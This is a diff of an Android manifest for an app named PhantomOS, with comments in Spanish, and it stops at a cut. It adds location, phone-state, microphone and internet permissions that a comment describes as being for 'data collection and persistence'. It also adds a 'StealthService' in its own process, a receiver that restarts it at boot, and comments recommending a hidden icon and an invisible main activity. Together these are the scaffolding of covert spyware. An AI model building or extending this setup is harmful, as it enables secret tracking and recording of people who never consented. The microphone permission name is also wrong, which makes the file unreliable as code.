@@ -1,11 +1,44 @@
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.phantom.os">
+
+    <!-- Permisos esenciales para la recolección de datos y persistencia -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.MICROPHONE" />
+    
+    <!-- Para ocultar el icono de la app (Opcional pero recomendado) -->
     <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
-        android:theme="@style/Theme.PhantomOS">
-        <activity
-            android:name=".ui.MainActivity"
+        android:theme="@style/AppTheme">
+
+        <!-- Servicio Principal: El corazón de PhantomOS -->
+        <service
+            android:name=".services.StealthService"
+            android:enabled="true"
+            android:exported="false"
+            android:process=":stealth_core" />
+
+        <!-- Receptor para reiniciar el servicio al encender el teléfono -->
+        <receiver
+            android:name=".receivers.BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Actividad principal (puede ser invisible o minimalista) -->
+        <activity android:name=".activities.MainActivity"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
